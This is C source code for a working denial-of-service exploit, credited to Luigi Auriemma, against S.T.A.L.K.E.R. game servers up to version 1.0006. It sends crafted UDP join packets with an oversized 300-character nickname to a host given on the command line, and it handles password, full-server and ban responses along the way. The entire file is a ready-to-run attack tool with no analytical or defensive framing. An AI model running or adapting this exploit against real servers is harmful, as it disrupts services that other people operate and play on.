/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;time.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
    #include &quot;winerr.h&quot;

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netinet/in.h&gt;
    #include &lt;netdb.h&gt;

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         &quot;0.1&quot;
#define BUFFSZ      1472
#define PORT        5445



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *dst, int chr, int len);
int putws(u8 *dst, u8 *src);
int fgetz(FILE *fd, u8 *data, int size);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     res,
            seed;
    int     sd,
            i,
            len,
            pwdlen,
            nicklen,
            pck;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            nick[300],  // major than 64
            pwd[64]     = &quot;&quot;,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;S.T.A.L.K.E.R. &lt;= 1.0006 Denial of Service &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    aluigi.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;host&gt; [port(%hu)]\n&quot;
            &quot;\n&quot;, argv[0], port);
        exit(1);
    }

    if(argc &gt; 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf(&quot;- target   %s : %hu\n&quot;, inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    seed = time(NULL);

    do {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd &lt; 0) std_err();

        seed = (seed * 0x343FD) + 0x269EC3;

        for(pck = 0; pck &lt;= 4; pck++) {
            p = buff;
            switch(pck) {
                case 0: {
                    *p++ = 0x88;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, 0x00010006, 32);  // not verified
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 1: {
                    *p++ = 0x80;
                    *p++ = 0x02;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, 0x00010006, 32);  // not verified
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 2: {
                    *p++ = 0x3f;
                    *p++ = 0x02;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, seed,       32);
                    break;
                }
                case 3: {
                    memset(nick, &#039;A&#039;, sizeof(nick));
                    nick[sizeof(nick) - 1] = 0;

                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, 0x000000c1, 32);
                    p += putxx(p, 0x00000002, 32);
                    p += putxx(p, 0x00000007, 32);
                    p += putcc(p, 0,          0x50);// hash at 0x48 set to zeroes
                    pwdlen = putws(p, pwd);   p += pwdlen;
                    p += putcc(p, 0,          4);   // don&#039;t know
                    strncpy(p, nick, 0x80);   p += 0x80;
                    p += putxx(p, 1,          32);
                    nicklen = putws(p, nick); p += nicklen;

                    putxx(buff + 0x10, 0xe0 + pwdlen, 32);
                    putxx(buff + 0x14, nicklen, 32);
                    putxx(buff + 0x18, 0x58 + pwdlen, 32);
                    if(pwd[0]) putxx(buff + 0x20, 0x58, 32);
                    putxx(buff + 0x24, pwdlen, 32);
                    break;
                }
                case 4: {
                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x02;
                    *p++ = 0x02;
                    p += putxx(p, 0x000000c3, 32);
                    break;
                }
                default: break;
            }

            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &amp;peer, 1);

            if(pck == 3) {
                while(buff[0] != 0x7f) {
                    len = send_recv(sd, NULL, 0, buff, BUFFSZ, &amp;peer, 1);
                }
                getxx(buff + 8, &amp;res, 32);
                if(res == 0x80158410) {
                    printf(&quot;\n- server is protected by password, insert it: &quot;);
                    fgetz(stdin, pwd, sizeof(pwd));
                    break;
                } else if(res == 0x80158610) {
                    printf(&quot;\n  server full &quot;);
                    for(i = 5; i; i--) {
                        printf(&quot;%d\b&quot;, i);
                        sleep(ONESEC);
                    }
                    break;
                } else if(res == 0x80158260) {
                    printf(&quot;\nError: your IP is banned\n&quot;);
                    exit(1);
                } else if(res) {
                    printf(&quot;\nError: unknown error number (0x%08x)\n&quot;, res);
                    //exit(1);
                }
            }
        }

        close(sd);
    } while(pck &lt;= 4);

    printf(&quot;\n- done\n&quot;);
    return(0);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc(&#039;.&#039;, stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              &lt; 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 1)) break;
        }
    } else {
        if(timeout(sd, 3) &lt; 0) retry = -1;
    }

    if(retry &lt; 0) {
        if(!err) return(-1);
        printf(&quot;\nError: socket timeout, no reply received\n\n&quot;);
        exit(1);
    }

    fputc(&#039;.&#039;, stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len &lt; 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *dst, int chr, int len) {
    memset(dst, chr, len);
    return(len);
}



int putws(u8 *dst, u8 *src) {
    u8      *d,
            *s;

    if(!src[0]) return(0);  // as required by stalker
    for(s = src, d = dst; ; s++) {
        *d++ = *s;
        *d++ = 0;
        if(!*s) break;
    }
    return(d - dst);
}



int fgetz(FILE *fd, u8 *data, int size) {
    u8     *p;

    if(!fgets(data, size, fd)) return(-1);
    for(p = data; *p &amp;&amp; (*p != &#039;\n&#039;) &amp;&amp; (*p != &#039;\r&#039;); p++);
    *p = 0;
    return(p - data);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits &gt;&gt; 3;
    for(num = i = 0; i &lt; bytes; i++) {
        num |= (data[i] &lt;&lt; (i &lt;&lt; 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits &gt;&gt; 3;
    for(i = 0; i &lt; bytes; i++) {
        data[i] = (num &gt;&gt; (i &lt;&lt; 3)) &amp; 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    if(select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout)
      &lt;= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolv hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u32 *)hp-&gt;h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif



